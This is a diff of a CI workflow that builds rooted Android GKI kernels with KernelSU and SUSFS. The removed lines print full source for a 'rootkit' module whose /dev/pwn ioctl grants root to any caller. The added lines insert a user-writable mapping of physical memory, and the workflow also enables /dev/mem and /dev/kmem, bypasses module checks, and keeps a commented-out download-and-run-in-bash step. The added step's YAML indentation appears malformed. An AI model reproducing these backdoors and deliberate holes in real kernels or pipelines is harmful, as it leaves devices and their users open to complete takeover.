@@ -22,6 +22,7 @@ on:
         required: false
         type: string
         default: "v1.5.12"
+      # revision input removed; A12 boot image download uses fixed r1
 
 jobs:
   build-gki:
@@ -35,7 +36,10 @@ jobs:
           
       - name: Set CONFIG Environment Variable
         run: |
+          # Set CONFIG dynamically based on inputs values
           CONFIG="${{ inputs.android_version }}-${{ inputs.kernel_version }}-${{ inputs.sub_level }}"
+
+          # Set CONFIG as an environment variable for future steps
           echo "CONFIG=$CONFIG" >> $GITHUB_ENV
 
       - name: Setup Build Environment
@@ -74,31 +78,58 @@ jobs:
           git clone https://github.com/WildKernels/kernel_patches.git
           git clone https://gitlab.com/simonpunk/susfs4ksu.git -b "$SUSFS_BRANCH"
           
+          # Checkout specific commits for SUSFS v1.5.9 if enabled
           if [ "${{ inputs.susfs_version }}" = "v1.5.9" ]; then
             cd susfs4ksu
             case "${{ inputs.android_version }}-${{ inputs.kernel_version }}" in
-              "android15-6.6") git checkout 2598fee8963adab11c255bf28521df32912e027f ;;
-              "android14-6.1") git checkout 646cfabce9d5dba5b806e9cbe2c198128ebd0e69 ;;
-              "android14-5.15") git checkout ab4d9570a9494a67c290002f3b28e69dd370a0f5 ;;
-              "android13-5.15") git checkout a21f265695f2869a6f3fc71a70328aa6d0f4a3ae ;;
-              "android13-5.10") git checkout 8acbd10775a447f546b14c6bded6f476a7f4733f ;;
-              "android12-5.10") git checkout 6f42c0e24e35a6fa0fc43051a5f1e7dfe568e8c2 ;;
+              "android15-6.6")
+                git checkout 2598fee8963adab11c255bf28521df32912e027f
+                ;;
+              "android14-6.1")
+                git checkout 646cfabce9d5dba5b806e9cbe2c198128ebd0e69
+                ;;
+              "android14-5.15")
+                git checkout ab4d9570a9494a67c290002f3b28e69dd370a0f5
+                ;;
+              "android13-5.15")
+                git checkout a21f265695f2869a6f3fc71a70328aa6d0f4a3ae
+                ;;
+              "android13-5.10")
+                git checkout 8acbd10775a447f546b14c6bded6f476a7f4733f
+                ;;
+              "android12-5.10")
+                git checkout 6f42c0e24e35a6fa0fc43051a5f1e7dfe568e8c2
+                ;;
             esac
             cd ..
           fi
           
+          # Checkout specific commits for SUSFS v1.5.12 if enabled
           if [ "${{ inputs.susfs_version }}" = "v1.5.12" ]; then
             cd susfs4ksu
             case "${{ inputs.android_version }}-${{ inputs.kernel_version }}" in
-              "android12-5.10") git checkout ed19454a4b5905e6718c9a22fad769b906837931 ;;
-              "android13-5.10") git checkout 8919927b63d95e62d33842452b9a60546187fb7b ;;
-              "android13-5.15") git checkout 700b9316b5a1cab174401b57f4198782a17154fb ;;
-              "android14-5.15") git checkout e1b1bba04b3cada700b8fd5bda4cfd4c59de07a2 ;;
-              "android14-6.1") git checkout f16560ce8263fbfa9b2f259e9531f72d6fda4e3f ;;
-              "android15-6.6") git checkout c49b1dab205bbc4ef20b120e84c5b7530355961d ;;
+              "android12-5.10")
+                git checkout ed19454a4b5905e6718c9a22fad769b906837931
+                ;;
+              "android13-5.10")
+                git checkout 8919927b63d95e62d33842452b9a60546187fb7b
+                ;;
+              "android13-5.15")
+                git checkout 700b9316b5a1cab174401b57f4198782a17154fb
+                ;;
+              "android14-5.15")
+                git checkout e1b1bba04b3cada700b8fd5bda4cfd4c59de07a2
+                ;;
+              "android14-6.1")
+                git checkout f16560ce8263fbfa9b2f259e9531f72d6fda4e3f
+                ;;
+              "android15-6.6")
+                git checkout c49b1dab205bbc4ef20b120e84c5b7530355961d
+                ;;
             esac
             cd ..
           fi
+          
 
       - name: Initialize and Sync Kernel Source
         run: |
@@ -150,6 +181,7 @@ jobs:
 
       - name: Apply glibc 2.38 Compatibility Fix
         run: |
+          # Use ACTUAL_SUBLEVEL for LTS builds, otherwise use the input sub_level
           SUBLEVEL_TO_CHECK="${ACTUAL_SUBLEVEL:-${{ inputs.sub_level }}}"
           
           if ([[ "${{ inputs.android_version }}" == "android13" ]] && [[ "${{ inputs.kernel_version }}" == "5.10" ]] && (( $SUBLEVEL_TO_CHECK <= 186 ))) || 
@@ -202,6 +234,7 @@ jobs:
         run: |
           cd "$CONFIG"
           
+          # Apply compatibility fixes
           if [ "${{ inputs.susfs_version }}" = "v1.5.9" ]; then
             SUSFS_VERSION="1.5.9"
           else
@@ -211,10 +244,12 @@ jobs:
           cp ../susfs4ksu/kernel_patches/fs/* ./common/fs/
           cp ../susfs4ksu/kernel_patches/include/linux/* ./common/include/linux/
 
+          # Apply core SUSFS patches
           cp ../susfs4ksu/kernel_patches/50_add_susfs_in_gki-${{ inputs.android_version }}-${{ inputs.kernel_version }}.patch ./common/
           cd common
           patch -p1 < 50_add_susfs_in_gki-${{ inputs.android_version }}-${{ inputs.kernel_version }}.patch || true
 
+          # Apply additional SUSFS patches for Android 13 5.15 compatibility
           if [[ "${{ inputs.android_version }}" == "android13" ]] && [[ "${{ inputs.kernel_version }}" == "5.15" ]] && (( ${{ inputs.sub_level }} <= 41 )); then
             cp ../../kernel_patches/wild/susfs_fix_patches/v${SUSFS_VERSION}/fix_fdinfo.c.patch ./
             patch -p1 < fix_fdinfo.c.patch || true
@@ -225,6 +260,7 @@ jobs:
             sed -i 's/i_uid_into_mnt(i_user_ns(inode), inode)/i_uid_into_mnt(inode->i_sb->s_user_ns, inode)/g' fs/susfs.c
           fi
 
+          # Apply KSU integration patches
           cd ../Wild_KSU
           cp ../../susfs4ksu/kernel_patches/KernelSU/10_enable_susfs_for_ksu.patch .
           patch -p1 < 10_enable_susfs_for_ksu.patch || true
@@ -244,6 +280,7 @@ jobs:
           cp ../../kernel_patches/wild/hooks/scope_min_manual_hooks_v1.4.patch ./
           patch -p1 -F 3 < scope_min_manual_hooks_v1.4.patch
 
+
       - name: Apply KSMA Mapping Patch
         run: |
           cd "$CONFIG/common"
@@ -261,133 +298,6 @@ jobs:
           } > /tmp/ksma_patch.txt
           sed -i '/\tmap_memory x0, x1, x5, x6, x7, x3, x4, x10, x11, x12, x13, x14/r /tmp/ksma_patch.txt' arch/arm64/kernel/head.S
 
-      - name: Add Custom Rootkit LKM Module
-        run: |
-          cd "$CONFIG/common"
-          
-          # Create drivers/rootkit directory
-          mkdir -p drivers/rootkit
-          
-          # Create rootkit.c in drivers/rootkit/
-          cat > drivers/rootkit/rootkit.c << 'ROOTKIT_EOF'
-          #include <linux/module.h>
-          #include <linux/kernel.h>
-          #include <linux/init.h>
-          #include <linux/fs.h>
-          #include <linux/uaccess.h>
-          #include <linux/cred.h>
-          #include <linux/device.h>
-
-          #define DEVICE_NAME "pwn"
-          #define CLASS_NAME "pwn"
-          #define IOCTL_GET_ROOT _IO(0, 0)
-
-          static int major_num;
-          static struct class* pwn_class = NULL;
-          static struct device* pwn_device = NULL;
-
-          static long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param) {
-              if (ioctl_num == IOCTL_GET_ROOT) {
-                  struct cred *new_creds = prepare_creds();
-                  if (new_creds) {
-                      new_creds->uid.val = new_creds->gid.val = 0;
-                      new_creds->euid.val = new_creds->egid.val = 0;
-                      new_creds->suid.val = new_creds->sgid.val = 0;
-                      new_creds->fsuid.val = new_creds->fsgid.val = 0;
-                      commit_creds(new_creds);
-                      return 0;
-                  }
-                  return -ENOMEM;
-              }
-              return -EINVAL;
-          }
-
-          static struct file_operations fops = {
-              .owner = THIS_MODULE,
-              .unlocked_ioctl = device_ioctl,
-          };
-
-          static int __init rootkit_init(void) {
-              printk(KERN_INFO "pwn: Initializing module\n");
-              
-              major_num = register_chrdev(0, DEVICE_NAME, &fops);
-              if (major_num < 0) {
-                  printk(KERN_ALERT "pwn: Failed to register major number\n");
-                  return major_num;
-              }
-              printk(KERN_INFO "pwn: Registered with major number %d\n", major_num);
-              
-              pwn_class = class_create(THIS_MODULE, CLASS_NAME);
-              if (IS_ERR(pwn_class)) {
-                  unregister_chrdev(major_num, DEVICE_NAME);
-                  printk(KERN_ALERT "pwn: Failed to register device class\n");
-                  return PTR_ERR(pwn_class);
-              }
-              printk(KERN_INFO "pwn: Device class registered\n");
-              
-              pwn_device = device_create(pwn_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
-              if (IS_ERR(pwn_device)) {
-                  class_destroy(pwn_class);
-                  unregister_chrdev(major_num, DEVICE_NAME);
-                  printk(KERN_ALERT "pwn: Failed to create device\n");
-                  return PTR_ERR(pwn_device);
-              }
-              printk(KERN_INFO "pwn: Device created successfully\n");
-              
-              return 0;
-          }
-
-          static void __exit rootkit_exit(void) {
-              device_destroy(pwn_class, MKDEV(major_num, 0));
-              class_destroy(pwn_class);
-              unregister_chrdev(major_num, DEVICE_NAME);
-              printk(KERN_INFO "pwn: Module unloaded\n");
-          }
-
-          MODULE_LICENSE("GPL");
-          MODULE_AUTHOR("Security Research");
-          MODULE_DESCRIPTION("PWN Device Driver");
-          MODULE_VERSION("1.0");
-
-          module_init(rootkit_init);
-          module_exit(rootkit_exit);
-          ROOTKIT_EOF
-          
-          echo "Created drivers/rootkit/rootkit.c"
-          
-          # Create Makefile in drivers/rootkit/
-          cat > drivers/rootkit/Makefile << 'MAKEFILE_EOF'
-          # SPDX-License-Identifier: GPL-2.0
-          obj-$(CONFIG_ROOTKIT_MODULE) += rootkit.o
-          MAKEFILE_EOF
-          
-          echo "Created drivers/rootkit/Makefile"
-          
-          # Create Kconfig in drivers/rootkit/
-          cat > drivers/rootkit/Kconfig << 'KCONFIG_EOF'
-          # SPDX-License-Identifier: GPL-2.0
-          config ROOTKIT_MODULE
-              tristate "PWN Device Driver"
-              help
-                Custom device driver for privilege escalation research.
-                Creates /dev/pwn device node.
-          KCONFIG_EOF
-          
-          echo "Created drivers/rootkit/Kconfig"
-          
-          # Add to drivers/Makefile
-          if ! grep -q "obj-\$(CONFIG_ROOTKIT_MODULE)" drivers/Makefile; then
-              echo "obj-\$(CONFIG_ROOTKIT_MODULE) += rootkit/" >> drivers/Makefile
-              echo "Added rootkit to drivers/Makefile"
-          fi
-          
-          # Add to drivers/Kconfig
-          if ! grep -q "source \"drivers/rootkit/Kconfig\"" drivers/Kconfig; then
-              # Find the endmenu line and add before it
-              sed -i '/^endmenu$/i source "drivers/rootkit/Kconfig"' drivers/Kconfig
-              echo "Added rootkit to drivers/Kconfig"
-          fi
-
       - name: Scan and collect patch rejects
         if: ${{ always() }}
         run: |
@@ -395,16 +305,19 @@ jobs:
           CONFIG_DIR="$CONFIG"
           REJECTS_DIR="$GITHUB_WORKSPACE/patch-rejects"
           mkdir -p "$REJECTS_DIR"
+          # Find all .rej files under the configuration directory
           mapfile -t REJS < <(find "$CONFIG_DIR" -type f -name '*.rej')
           REJ_COUNT=${#REJS[@]}
           echo "Found $REJ_COUNT .rej files under $CONFIG_DIR"
           echo "REJ_COUNT=$REJ_COUNT" >> $GITHUB_ENV
           if [ "$REJ_COUNT" -gt 0 ]; then
             for REJ in "${REJS[@]}"; do
+              # Relative path from $CONFIG
               REL="${REJ#"$CONFIG_DIR"/}"
               DEST="$REJECTS_DIR/$REL"
               mkdir -p "$(dirname "$DEST")"
               cp "$REJ" "$DEST"
+              # Copy the associated original file alongside the .rej
               ORIG="${REJ%.rej}"
               if [ -f "$ORIG" ]; then
                 ORIG_DEST="$REJECTS_DIR/${REL%.rej}"
@@ -414,6 +327,34 @@ jobs:
               echo "$REL" >> "$REJECTS_DIR/index.txt"
             done
           fi
+
+      #- name: Add BBG
+        #run: |
+          #cd "$CONFIG"
+          #echo "Adding BBG..."
+          #wget -O- https://github.com/vc-teahouse/Baseband-guard/raw/main/setup.sh | bash
+          #echo "CONFIG_BBG=y" >> common/arch/arm64/configs/gki_defconfig
+          
+          # Before sed: Show the original LSM default line for comparison
+          #echo "=== Before sed ==="
+          #sed -n '/^config LSM$/,/^help$/{ /^[[:space:]]*default/ p }' common/security/Kconfig
+          
+          # Apply the sed command to add baseband_guard to default security configurations
+          #sed -i '/^config LSM$/,/^help$/{ /^[[:space:]]*default/ { /baseband_guard/! s/lockdown/lockdown,baseband_guard/ } }' common/security/Kconfig
+          
+          # After sed: Show the updated LSM default line
+          #echo "=== After sed ==="
+          #sed -n '/^config LSM$/,/^help$/{ /^[[:space:]]*default/ p }' common/security/Kconfig
+          
+          # Confirm baseband_guard is now present (should output the line if successful)
+          #echo "=== Confirmation: grep for baseband_guard ==="
+          #if ! grep -q "baseband_guard" common/security/Kconfig; then
+            #echo "ERROR: baseband_guard not found after sed - stopping workflow"
+            #exit 1
+          #else
+            #echo "SUCCESS: baseband_guard found in security configuration"
+            #grep "baseband_guard" common/security/Kconfig
+          #fi
 
       - name: Apply Module Check Bypass
         if: ${{ matrix.apply_module_check_bypass == 'bypass' }}
@@ -444,20 +385,54 @@ jobs:
           cp "../../../kernel_patches/samsung/min_kdp/min_kdp.c" min_kdp.c
           echo "obj-y += min_kdp.o" >> Makefile
 
+
+      - name: Apply Manual Physical-to-Virtual Mapping Patch 
+            run: |
+                  cd "$CONFIG/common"
+                  cat > mapping.patch << 'EOF'
+                  diff --git a/arch/arm64/mm/mmu.c b/arch/arm64/mm/mmu.c
+                  index 2e0821b99..6ec764085 100644
+                  --- a/arch/arm64/mm/mmu.c
+                  +++ b/arch/arm64/mm/mmu.c
+                  @@ -755,6 +755,22 @@ void __init paging_init(void)
+                         map_kernel(pgdp);
+                         map_mem(pgdp);
+                  
+                  +       {
+                  +               phys_addr_t phys = 0x80000000;
+                  +               unsigned long virt = 0xffffff8000000000;
+                  +               phys_addr_t size = SZ_1G;
+                  +               /*
+                  +                * DANGEROUS: Create a 1GB mapping of physical memory at 0x80000000
+                  +                * to virtual address 0xffffff8000000000 with user-space R/W access.
+                  +                * This is for a specific QEMU test case and breaks kernel security.
+                  +                * The mapping is R/W, user-accessible, and non-executable.
+                  +                */
+                  +               pgprot_t prot = __pgprot(PROT_SECT_NORMAL | PTE_USER | PTE_WRITE);
+                  +
+                  +               __create_pgd_mapping(pgdp, phys, virt, size, prot,
+                  +                                    early_pgtable_alloc, 0);
+                  +       }
+                  +
+                         pgd_clear_fixmap();
+                  
+                         cpu_replace_ttbr1(lm_alias(swapper_pg_dir));
+                  EOF
+                  patch -p1 < mapping.patch
+
+
+
       - name: Apply Kernel Configuration
         run: |
           cd "$CONFIG"
           
           defconfig="./common/arch/arm64/configs/gki_defconfig"
           
-          echo "Applying kernel configurations..."
+          echo "Applying kernel configurations one by one..."
           
           # KernelSU Core Configuration
           echo "CONFIG_KSU=y" >> "$defconfig"
           echo "CONFIG_KSU_KPROBES_HOOK=n" >> "$defconfig"
-          
-          # Rootkit Module Configuration
-          echo "CONFIG_ROOTKIT_MODULE=m" >> "$defconfig"
           
           # Mountify Support
           echo "CONFIG_TMPFS_XATTR=y" >> "$defconfig"
@@ -493,20 +468,33 @@ jobs:
 
           # SUSFS Configuration
           echo "CONFIG_KSU_SUSFS=y" >> "$defconfig"
+          #echo "CONFIG_KSU_SUSFS_HAS_MAGIC_MOUNT=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_SUS_PATH=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_SUS_MOUNT=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_TRY_UMOUNT=y" >> "$defconfig"
+          
           echo "CONFIG_KSU_SUSFS_AUTO_ADD_SUS_KSU_DEFAULT_MOUNT=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_AUTO_ADD_SUS_BIND_MOUNT=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_AUTO_ADD_TRY_UMOUNT_FOR_BIND_MOUNT=y" >> "$defconfig"
+          
           echo "CONFIG_KSU_SUSFS_SUS_KSTAT=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_SUS_OVERLAYFS=n" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_SPOOF_UNAME=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_SPOOF_CMDLINE_OR_BOOTCONFIG=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_OPEN_REDIRECT=y" >> "$defconfig"
+          
           echo "CONFIG_KSU_SUSFS_ENABLE_LOG=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_HIDE_KSU_SUSFS_SYMBOLS=y" >> "$defconfig"
           echo "CONFIG_KSU_SUSFS_SUS_SU=n" >> "$defconfig"
+          
+          # Sound Configuration
+          #echo "CONFIG_SND=y" >> "$defconfig"
+          #echo "CONFIG_SND_DRIVERS=y" >> "$defconfig"
+          #echo "CONFIG_SND_PCM=y" >> "$defconfig"
+          #echo "CONFIG_SND_TIMER=y" >> "$defconfig"
+          #echo "CONFIG_SND_DYNAMIC_MINORS=y" >> "$defconfig"
+          #echo "CONFIG_SND_PROC_FS=y" >> "$defconfig"
+          #echo "CONFIG_SND_ALOOP=m" >> "$defconfig"
           
           # Build Optimization Configuration
           echo "CONFIG_LTO_CLANG_THIN=y" >> "$defconfig"
@@ -515,7 +503,8 @@ jobs:
           echo "CONFIG_CC_OPTIMIZE_FOR_PERFORMANCE_O3=n" >> "$defconfig"
           echo "CONFIG_OPTIMIZE_INLINING=y" >> "$defconfig"
 
-          # /dev/mem Access Configuration
+          # /dev/mem Access: Ensure CONFIG_DEVMEM is enabled and CONFIG_STRICT_DEVMEM is disabled
+          # First, remove or comment out any existing lines that disable CONFIG_DEVMEM
           sed -i '/^CONFIG_VIRTIO_PCI[= ]/d; /^# CONFIG_VIRTIO_PCI is not set$/d' "$defconfig"
           sed -i '/^CONFIG_VIRTIO_BLK[= ]/d; /^# CONFIG_VIRTIO_BLK is not set$/d' "$defconfig"
           sed -i '/^CONFIG_PTDUMP_DEBUGFS[= ]/d; /^# CONFIG_PTDUMP_DEBUGFS is not set$/d' "$defconfig"
@@ -529,9 +518,12 @@ jobs:
           echo "CONFIG_VIRTIO_BLK=y" >> "$defconfig"
           sed -i 's/^CONFIG_DEVMEM=n/# CONFIG_DEVMEM is not set/' "$defconfig"
           sed -i 's/^# CONFIG_DEVMEM is not set/CONFIG_DEVMEM=y/' "$defconfig"
+          # Explicitly add the desired setting
           echo "CONFIG_DEVMEM=y" >> "$defconfig"
+          # Explicitly disable CONFIG_STRICT_DEVMEM
           sed -i 's/^CONFIG_STRICT_DEVMEM=y/# CONFIG_STRICT_DEVMEM is not set/' "$defconfig"
           echo "# CONFIG_STRICT_DEVMEM is not set" >> "$defconfig"
+          # Ensure CONFIG_DEVKMEM is enabled as well
           sed -i 's/^CONFIG_DEVKMEM=n/# CONFIG_DEVKMEM is not set/' "$defconfig"
           sed -i 's/^# CONFIG_DEVKMEM is not set/CONFIG_DEVKMEM=y/' "$defconfig"
           echo "CONFIG_DEVKMEM=y" >> "$defconfig"
@@ -545,16 +537,18 @@ jobs:
           sed -i '/^CONFIG_NET_9P_VIRTIO[= ].*/d' "$defconfig"
           sed -i '/^CONFIG_GDB_SCRIPTS[= ].*/d' "$defconfig"
 
-          # Handle CONFIG_CMDLINE
+          # Handle CONFIG_CMDLINE: append console=ttyAMA0 and ramoops parameters if not already present
           if grep -q "^CONFIG_CMDLINE" "$defconfig"; then
+              # If CONFIG_CMDLINE exists, append only missing arguments
               sed -i '/^CONFIG_CMDLINE=/{
                   s/"$/ ,console=ttyAMA0 ramoops.mem_address=0x80d00000 ramoops.mem_size=0x240000 ramoops.console_size=0x40000 ramoops.pmsg_size=0x200000 ramoops.record_size=0x8000"/
               }' "$defconfig"
           else
+              # If CONFIG_CMDLINE doesn't exist, add it
               echo 'CONFIG_CMDLINE="console=ttyAMA0 ramoops.mem_address=0x80d00000 ramoops.mem_size=0x240000 ramoops.console_size=0x40000 ramoops.pmsg_size=0x200000 ramoops.record_size=0x8000"' >> "$defconfig"
           fi
 
-          # Debug and Development Configuration
+          # Append the new configurations
           echo "CONFIG_KGDB=y" >> "$defconfig"
           echo "CONFIG_KGDB_SERIAL_CONSOLE=y" >> "$defconfig"
           echo "CONFIG_DEBUG_KERNEL=y" >> "$defconfig"
@@ -571,22 +565,30 @@ jobs:
       - name: Change Kernel Name
         run: |
           cd "$CONFIG"
+          #Add Wild to Kernel Version
           sed -i '$s|echo "\$res"|echo "\$res-Wild"|' ./common/scripts/setlocalversion
+          #Set Kernel Timestamp
           perl -pi -e 's{UTS_VERSION="\$\(echo \$UTS_VERSION \$CONFIG_FLAGS \$TIMESTAMP \| cut -b -\$UTS_LEN\)"}{UTS_VERSION="#1 SMP PREEMPT Sun Apr 20 04:20:00 UTC 2025"}' ./common/scripts/mkcompile_h
           if [ -f "build/build.sh" ]; then
+            #Remove Dirty Flag
             sed -i 's/-dirty//' ./common/scripts/setlocalversion
           else
+            #Remove Dirty Flag
             sed -i "/stable_scmversion_cmd/s/-maybe-dirty//g" ./build/kernel/kleaf/impl/stamp.bzl
+            #Remove Abi Exports and Error
             rm -rf ./common/android/abi_gki_protected_exports_*
             perl -pi -e 's/^\s*"protected_exports_list"\s*:\s*"android\/abi_gki_protected_exports_aarch64",\s*$//;' ./common/BUILD.bazel
           fi
 
       - name: Set file name
         run: |
+          # Set artifact name base for consistent naming
+          # Prepare sublevel for naming
           SUBLEVEL_FOR_NAME="${{ inputs.sub_level }}"
           if [ -n "$ACTUAL_SUBLEVEL" ]; then
             SUBLEVEL_FOR_NAME="$ACTUAL_SUBLEVEL"
           fi
+          # Set artifact name base for consistent naming
           ARTIFACT_BASE="WKSU-${{ env.KSUVER }}-SUSFS_${{ inputs.susfs_version }}-${{ inputs.android_version }}-${{ inputs.kernel_version }}.${SUBLEVEL_FOR_NAME}-${{ inputs.os_patch_level }}-${{ matrix.apply_module_check_bypass == 'bypass' && 'Module_Check_Bypass' || 'Normal' }}"
           echo "ARTIFACT_BASE=$ARTIFACT_BASE" >> $GITHUB_ENV
           echo "FILE_NAME=$ARTIFACT_BASE" >> $GITHUB_ENV
@@ -607,6 +609,7 @@ jobs:
         run: |
           cd "$CONFIG"
           VMLINUX_PATH=""
+          # Locate vmlinux based on build system
           if [ -f "./out/${{ inputs.android_version }}-${{ inputs.kernel_version }}/dist/vmlinux" ]; then
             VMLINUX_PATH="./out/${{ inputs.android_version }}-${{ inputs.kernel_version }}/dist/vmlinux"
           elif [ -f "./bazel-bin/common/kernel_aarch64/vmlinux" ]; then
@@ -618,11 +621,13 @@ jobs:
             exit 1
           fi
 
+          # Copy to workspace root so upload-artifact can find it
           cp "$VMLINUX_PATH" "$GITHUB_WORKSPACE/vmlinux"
           echo "vmlinux copied to workspace root for artifact upload."
 
       - name: Prepare AnyKernel3
         run: |
+          # Copy Image from normal build locations
           if [ -f "./$CONFIG/out/${{ inputs.android_version }}-${{ inputs.kernel_version }}/dist/Image" ]; then
             cp ./$CONFIG/out/${{ inputs.android_version }}-${{ inputs.kernel_version }}/dist/Image AnyKernel3/Image
           elif [ -f "./$CONFIG/bazel-bin/common/kernel_aarch64/Image" ]; then
@@ -632,73 +637,11 @@ jobs:
             exit 1
           fi
 
-      - name: Locate and Copy rootkit.ko and System.map
-        run: |
-          cd "$CONFIG"
-          
-          # Define possible output directories
-          OUT_DIR="./out/${{ inputs.android_version }}-${{ inputs.kernel_version }}/dist"
-          BAZEL_OUT_DIR="./bazel-bin/common/kernel_aarch64"
-          
-          # Search for rootkit.ko
-          echo "Searching for rootkit.ko..."
-          ROOTKIT_KO_PATH=""
-          
-          # Try standard locations first
-          for search_dir in "$BAZEL_OUT_DIR" "$OUT_DIR"; do
-            if [ -d "$search_dir" ]; then
-              echo "Checking directory: $search_dir"
-              found=$(find "$search_dir" -name "rootkit.ko" -type f -print -quit 2>/dev/null || true)
-              if [ -n "$found" ]; then
-                ROOTKIT_KO_PATH="$found"
-                echo "Found rootkit.ko at: $ROOTKIT_KO_PATH"
-                break
-              fi
-            fi
-          done
-          
-          # If not found, do a broader search
-          if [ -z "$ROOTKIT_KO_PATH" ]; then
-            echo "Searching recursively for rootkit.ko..."
-            ROOTKIT_KO_PATH=$(find . -name "rootkit.ko" -type f -print -quit 2>/dev/null || true)
-          fi
-          
-          if [ -n "$ROOTKIT_KO_PATH" ] && [ -f "$ROOTKIT_KO_PATH" ]; then
-            echo "Found rootkit.ko at: $ROOTKIT_KO_PATH"
-            cp "$ROOTKIT_KO_PATH" "$GITHUB_WORKSPACE/rootkit.ko"
-            echo "rootkit.ko copied to workspace root."
-          else
-            echo "ERROR: rootkit.ko not found after build."
-            echo "Searching all .ko files for debugging:"
-            find . -name "*.ko" -type f 2>/dev/null || true
-            exit 1
-          fi
-
-          # Search for System.map
-          echo "Searching for System.map..."
-          SYSTEM_MAP_PATH=""
-          
-          if [ -f "$BAZEL_OUT_DIR/System.map" ]; then
-            SYSTEM_MAP_PATH="$BAZEL_OUT_DIR/System.map"
-          elif [ -f "$OUT_DIR/System.map" ]; then
-            SYSTEM_MAP_PATH="$OUT_DIR/System.map"
-          else
-            SYSTEM_MAP_PATH=$(find . -name "System.map" -type f -print -quit 2>/dev/null || true)
-          fi
-
-          if [ -n "$SYSTEM_MAP_PATH" ] && [ -f "$SYSTEM_MAP_PATH" ]; then
-            echo "Found System.map at: $SYSTEM_MAP_PATH"
-            cp "$SYSTEM_MAP_PATH" "$GITHUB_WORKSPACE/System.map"
-            echo "System.map copied to workspace root."
-          else
-            echo "ERROR: System.map not found after build."
-            exit 1
-          fi
-
       - name: Search for Kernel Modules
         run: |
           echo "Searching for kernel modules (.ko files)..."
           
+          # Function to scan for modules (search only)
           scan_modules() {
             local search_dir="$1"
             local module_count=0
@@ -706,6 +649,7 @@ jobs:
             if [ -d "$search_dir" ]; then
               echo "Scanning directory: $search_dir"
               
+              # Find all .ko files and report their locations
               while IFS= read -r -d '' module_file; do
                 if [ -f "$module_file" ]; then
                   module_name=$(basename "$module_file")
@@ -718,18 +662,31 @@ jobs:
             return $module_count
           }
           
+          # Scan common build output directories
           total_modules=0
           
+          # Scan bazel-bin directory
           if scan_modules "./$CONFIG/bazel-bin"; then
             total_modules=$((total_modules + $?))
           fi
           
+          # Scan out directory
           if scan_modules "./$CONFIG/out"; then
             total_modules=$((total_modules + $?))
           fi
           
+          # Scan dist directory specifically
           if scan_modules "./$CONFIG/out/${{ inputs.android_version }}-${{ inputs.kernel_version }}/dist"; then
             total_modules=$((total_modules + $?))
+          fi
+          
+          # Look for snd-aloop.ko specifically
+          echo "Searching specifically for snd-aloop.ko..."
+          snd_aloop_found=$(find ./$CONFIG -name "snd-aloop.ko" -type f 2>/dev/null | head -1)
+          if [ -n "$snd_aloop_found" ]; then
+            echo "Found snd-aloop.ko at: $snd_aloop_found"
+          else
+            echo "snd-aloop.ko not found"
           fi
           
           echo "Total kernel modules found: $total_modules"
@@ -745,6 +702,7 @@ jobs:
           cp ./$CONFIG/out/${{ inputs.android_version }}-${{ inputs.kernel_version }}/dist/Image ./
           cp ./$CONFIG/out/${{ inputs.android_version }}-${{ inputs.kernel_version }}/dist/Image.lz4 ./
 
+          # Create gzip of the Image file
           gzip -n -k -f -9 ./Image > ./Image.gz
           gzip -n -k -f -9 ./Image > ./bootimgs/Image.gz
 
@@ -759,6 +717,7 @@ jobs:
           cp ./$CONFIG/bazel-bin/common/kernel_aarch64/Image ./
           cp ./$CONFIG/bazel-bin/common/kernel_aarch64/Image.lz4 ./
 
+          # Create gzip of the Image file
           gzip -n -k -f -9 ./Image > ./Image.gz
           gzip -n -k -f -9 ./Image > ./bootimgs/Image.gz
 
@@ -771,6 +730,7 @@ jobs:
           GKI_URL=https://dl.google.com/android/gki/gki-certified-boot-android12-5.10-"${{ inputs.os_patch_level }}"_r1.zip
           FALLBACK_URL=https://dl.google.com/android/gki/gki-certified-boot-android12-5.10-2023-01_r1.zip
           
+          # Check if the GKI URL is available
           echo "Checking if GKI kernel URL is reachable: $GKI_URL"
           status=$(curl -sL -w "%{http_code}" "$GKI_URL" -o /dev/null)
           
@@ -782,6 +742,7 @@ jobs:
               curl -Lo gki-kernel.zip "$FALLBACK_URL"
           fi
           
+          # Unzip the downloaded kernel and remove the zip
           echo "Unzipping the downloaded kernel..."
           unzip gki-kernel.zip && rm gki-kernel.zip
           
@@ -846,15 +807,6 @@ jobs:
             *-boot-lz4.img
           compression-level: 9
 
-      - name: Upload rootkit.ko and System.map
-        uses: actions/upload-artifact@v4
-        with:
-          name: ${{ env.FILE_NAME }}-Modules-and-SystemMap
-          path: |
-            rootkit.ko
-            System.map
-          compression-level: 6
-
       - name: Upload Build Diagnostics
         if: ${{ always() }}
         uses: actions/upload-artifact@v4
@@ -862,6 +814,7 @@ jobs:
           name: ${{ env.FILE_NAME }}-Rejected-Patches
           path: patch-rejects
           compression-level: 9
+
 
       - name: Upload vmlinux
         uses: actions/upload-artifact@v4
